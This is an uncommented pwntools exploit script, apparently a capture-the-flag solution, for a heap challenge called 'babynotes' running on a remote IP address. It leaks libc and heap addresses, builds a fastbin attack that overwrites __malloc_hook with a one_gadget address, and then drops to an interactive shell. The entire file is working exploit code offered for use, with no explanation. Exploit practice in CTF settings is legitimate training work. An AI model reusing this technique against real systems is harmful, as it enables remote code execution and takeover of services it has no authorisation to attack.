from pwn import *

io=remote('123.56.170.202',43121)
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#io=process('./babynotes')
libc=ELF('../libc-2.23.so')

def add(idx,size):
    io.recvuntil('>> ')
    io.sendline('1')
    io.recvuntil('index:')
    io.sendline(str(idx))
    io.recvuntil('size:')
    io.sendline(str(size))

def free(idx):
    io.recvuntil('>> ')
    io.sendline('3')
    io.recvuntil('index:')
    io.sendline(str(idx))

def show(idx):
    io.recvuntil('>> ')
    io.sendline('2')
    io.recvuntil('index:')
    io.sendline(str(idx))

def edit(idx,data):
    io.recvuntil('>> ')
    io.sendline('4')
    io.recvuntil('index:')
    io.sendline(str(idx))    
    io.recvuntil('note:')
    io.send(data)



io.recvuntil('name:')
io.sendline('1')
io.recvuntil('motto:')
io.sendline('1')
io.recvuntil('age:')
io.sendline('1')

add(0,0x100)
add(1,0x60)
add(2,0x60)
add(3,0x60)

#leak libc
free(0)
add(0,0x100)
show(0)

libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b78
malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0xf1207
print(hex(libc_base))

#leak heap
free(2)
free(1)
add(1,0x68)
show(1)
io.recvuntil('1:')
io.recv(1)
fake_chunk=u64(io.recv(4).ljust(8,'\x00'))+0x10
print(hex(fake_chunk))
add(2,0x60)

io.sendline('5')
io.recvuntil('name:')
io.sendline('1')
io.recvuntil('motto:')
io.sendline('1')
io.recvuntil('age:')
io.sendline(str(fake_chunk))

free(-3)
free(1)
free(2)
free(0)
add(0,0x60)
edit(0,p64(malloc_hook-0x23))
add(4,0x60)
add(5,0x60)
add(1,0x60)
edit(1, 'a'*0x13+p64(one_gadget))

add(2,0x10)
io.sendline('icq6ff2e51dc6d3fcddc3b64cb0f135a')
#gdb.attach(io)



io.interactive()


